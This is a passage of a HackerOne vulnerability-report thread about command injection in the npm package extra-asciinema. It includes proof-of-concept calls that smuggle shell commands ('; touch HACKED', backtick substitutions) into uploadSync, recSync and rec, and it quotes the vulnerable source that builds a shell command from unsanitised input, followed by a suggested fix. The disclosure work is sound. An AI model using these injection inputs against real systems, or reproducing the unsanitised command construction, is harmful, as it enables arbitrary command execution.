href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnodef%2Fextra-asciinema%2Fcommit%2Ffd1a8a38d6c72e1eb573b2ab03d5e86de8047480\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e var asciinema \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;./\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nundefined\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e asciinema.uploadSync\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;; touch HACKED\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\nasciinema: upload failed: \u003cspan class=\"o\"\u003e[\u003c/span\u003eErrno 2] No such file or directory: \u003cspan class=\"s1\"\u003e\u0026#39;; touch HACKED\u0026#39;\u003c/span\u003e\nUncaught Error: Command failed: asciinema upload \u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nb\"\u003etouch \u003c/span\u003eHACKED\nasciinema: upload failed: \u003cspan class=\"o\"\u003e[\u003c/span\u003eErrno 2] No such file or directory: \u003cspan class=\"s1\"\u003e\u0026#39;; touch HACKED\u0026#39;\u003c/span\u003e\n\n    at checkExecSyncError \u003cspan class=\"o\"\u003e(\u003c/span\u003echild_process.js:616:11\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n    at Object.execFileSync \u003cspan class=\"o\"\u003e(\u003c/span\u003echild_process.js:634:15\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n    at Object.uploadSync \u003cspan class=\"o\"\u003e(\u003c/span\u003e/home/wolfram/Documents/extra-asciinema/index.js:142:21\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  status: 1,\n  signal: null,\n  output: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n    null,\n    \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,\n    \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x\u003c/span\u003e\u003cspan class=\"s2\"\u003e1B[0;31masciinema: upload failed: [Errno 2] No such file or directory: \u0026#39;; touch HACKED\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x\u003c/span\u003e\u003cspan class=\"s2\"\u003e1B[0m\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n  pid: 68455,\n  stdout: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,\n  stderr: \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x\u003c/span\u003e\u003cspan class=\"s2\"\u003e1B[0;31masciinema: upload failed: [Errno 2] No such file or directory: \u0026#39;; touch HACKED\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x\u003c/span\u003e\u003cspan class=\"s2\"\u003e1B[0m\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-07-24T08:56:09.167Z","updated_at":"2020-07-24T08:56:09.167Z","actor":{"username":"wolfram77","cleared":false,"url":"/wolfram77","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8753569,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @wolfram77, thanks for providing a new version which seems to fix this vulnerability.\n\nCan you confirm that this resolves it @d3lla?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/wolfram77\"\u003e@wolfram77\u003c/a\u003e, thanks for providing a new version which seems to fix this vulnerability.\u003c/p\u003e\n\n\u003cp\u003eCan you confirm that this resolves it \u003ca href=\"/d3lla\"\u003e@d3lla\u003c/a\u003e?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-25T19:07:08.821Z","updated_at":"2020-07-25T19:07:27.119Z","actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8757830,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @danielruf and @wolfram77,\nthanks for your reply and for the fix.\n\nWhen I reported the issue I tested only the `uploadSync` function that now seems to be fixed.\nI run the previous poc:\n```javascript\nconst asciinema = require('extra-asciinema');\nasciinema.uploadSync('; touch HACKED');\n```\nand indeed I was not able to reproduce the previous reported result.\n\nHowever, now I tested also the other functions and it's still possible to inject arbitrary commands.\nIn particular I tested also the `asciinema.recSync` and `asciinema.rec` functions.\nHere is the `poc2.js` I used:\n```javascript\nconst asciinema = require('extra-asciinema');\n// asciinema.uploadSync('; touch HACKED');'; touch HACKED\n\nasciinema.recSync('saved.cast', {input: '\"; touch HACKED1\"'});\nasciinema.recSync('saved.cast', {input: './`touch HACKED2`/../'});\nasciinema.rec('saved.cast', {input: '`touch HACKED3`'});\nasciinema.rec('saved.cast', {input: './`touch HACKED4`/../'});\n\n```\n\nI think this is a corner case, because reading the documentation of `asciinema` (https://asciinema.org/docs/usage), it accepts a parameter called `command` that is the \"command to record\".\n\nIn this case the property `command` is build using the `o.input` parameter:\n```javascript\n// https://github.com/nodef/extra-asciinema/blob/master/src/_recCmd.ts#L9\n\nimport * as path from 'path';\n\nfunction recCmd(f: string, o: any=null): string[] {\n  var o = o||{};\n  // if input file given, execute on node.js\n  if(o.input) {\n    var dir = path.dirname(o.input);\n    var fil = path.basename(o.input);\n    o.command = `cd ${dir} \u0026\u0026 cat \"${fil}\" | node -i`; // \u003c-- HERE\n  }\n  o.overwrite = true;\n  o.yes = true;\n  var args = ['rec'];\n  ...\n  if(o.command) args.push('--command', o.command);\n  ...\n  return args;\n}\nexport default recCmd;\n\n// https://github.com/nodef/extra-asciinema/blob/master/src/rec.ts#L26\nfunction rec(f: string=null, o: RecOptions=null, fn: callbackFn=null): Promise\u003cany\u003e {\n  var f = f||path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'asciinema-')), '0.cast');\n  var p = new Promise((fres, frej) =\u003e {\n    cp.execFile('asciinema', recCmd(f, o), {encoding: 'utf8'}, (err) =\u003e {\n      if(err) return frej(err);\n      fres(f);\n    });\n  });\n  return p? p.then(a =\u003e fn(null, a), fn) : p;\n}\nexport default rec;\n\n// https://github.com/nodef/extra-asciinema/blob/master/src/recSync.ts#L24\nfunction recSync(f: string, o: RecOptions=null): string {\n  var f = f||path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'asciinema-')), '0.cast');\n  cp.execFileSync('asciinema', recCmd(f, o), {encoding: 'utf8'});\n  return f;\n}\nexport default recSync;\n```\n\nIf `o.input` is `\"; touch HACKED1\"`, the `o.command` will be `cd . \u0026\u0026 cat \"\"; touch HACKED1\"\" | node -i`, while\nif `o.input` is ``./`touch HACKED3`/../``,  the `o.command` will be ``'cd ./`touch HACKED3` \u0026\u0026 cat \"..\" | node -i``.\n\nIn this case, since you are calling the `cd` and `cat` commands (in the first case you need a directory while in the second case a filename), in my opinion, it is better to sanitize the value of `o.input` in order to avoid the above issues.\n\nI attached a poc video.\n{F923982}\n\n@danielruf and @wolfram77 please let me know what do you think about that.\n\nSome resources that could be helpful:\n- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\n- https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b\n\nA possible solution could be similar to this one (it's just a suggestion, feel free to choose what whatever you think best):\n- https://github.com/418sec/node-git-wrapper/pull/3/files\n\n```javascript\nvar escapeSpecialChars = function(cmd) {\n    return cmd.replace(/([`$\u0026{}[;|])/g,'');\n}\nfunction recCmd(f, o = null) {\n    var o = o || {};\n    \n    if (o.input) {\n        \n        var dir = path.dirname(escapeSpecialChars(o.input));\n        var fil = path.basename(escapeSpecialChars(o.input));\n        o.command = `cd ${dir} \u0026\u0026 cat \"${fil}\" | node -i`;\n    }\n    ...\n```\n\n\n\nThank you for your time,\nd3lla\n\n\nI tested using the following configurations:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/danielruf\"\u003e@danielruf\u003c/a\u003e and \u003ca href=\"/wolfram77\"\u003e@wolfram77\u003c/a\u003e,\u003cbr\u003e\nthanks for your reply and for the fix.\u003c/p\u003e\n\n\u003cp\u003eWhen I reported the issue I tested only the \u003ccode\u003euploadSync\u003c/code\u003e function that now seems to be fixed.\u003cbr\u003e\nI run the previous poc:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eextra-asciinema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euploadSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e; touch HACKED\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand indeed I was not able to reproduce the previous reported result.\u003c/p\u003e\n\n\u003cp\u003eHowever, now I tested also the other functions and it\u0026#39;s still possible to inject arbitrary commands.\u003cbr\u003e\nIn particular I tested also the \u003ccode\u003easciinema.recSync\u003c/code\u003e and \u003ccode\u003easciinema.rec\u003c/code\u003e functions.\u003cbr\u003e\nHere is the \u003ccode\u003epoc2.js\u003c/code\u003e I used:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eextra-asciinema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// asciinema.uploadSync(\u0026#39;; touch HACKED\u0026#39;);\u0026#39;; touch HACKED\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erecSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esaved.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;; touch HACKED1\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erecSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esaved.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e./`touch HACKED2`/../\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esaved.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e`touch HACKED3`\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esaved.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e./`touch HACKED4`/../\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI think this is a corner case, because reading the documentation of \u003ccode\u003easciinema\u003c/code\u003e (\u003ca title=\"https://asciinema.org/docs/usage\" href=\"/redirect?url=https%3A%2F%2Fasciinema.org%2Fdocs%2Fusage\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://asciinema.org/docs/usage\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), it accepts a parameter called \u003ccode\u003ecommand\u003c/code\u003e that is the \u0026quot;command to record\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eIn this case the property \u003ccode\u003ecommand\u003c/code\u003e is build using the \u003ccode\u003eo.input\u003c/code\u003e parameter:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// https://github.com/nodef/extra-asciinema/blob/master/src/_recCmd.ts#L9\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eimport\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e \u003cspan class=\"k\"\u003efrom\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003epath\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erecCmd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eany\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e \u003cspan class=\"nx\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e[]\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"o\"\u003e||\u003c/span\u003e\u003cspan class=\"p\"\u003e{};\u003c/span\u003e\n  \u003cspan class=\"c1\"\u003e// if input file given, execute on node.js\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003edir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edirname\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003efil\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebasename\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecommand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`cd \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003edir\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u0026amp;\u0026amp; cat \u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003efil\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot; | node -i`\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026lt;-- HERE\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eoverwrite\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eyes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eargs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003erec\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e--command\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"k\"\u003eexport\u003c/span\u003e \u003cspan class=\"k\"\u003edefault\u003c/span\u003e \u003cspan class=\"nx\"\u003erecCmd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// https://github.com/nodef/extra-asciinema/blob/master/src/rec.ts#L26\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003estring\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eRecOptions\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efn\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallbackFn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e \u003cspan class=\"nb\"\u003ePromise\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003eany\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"o\"\u003e||\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emkdtempSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eos\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etmpdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003easciinema-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e0.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003ePromise\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003efres\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efrej\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ecp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexecFile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003easciinema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003erecCmd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan 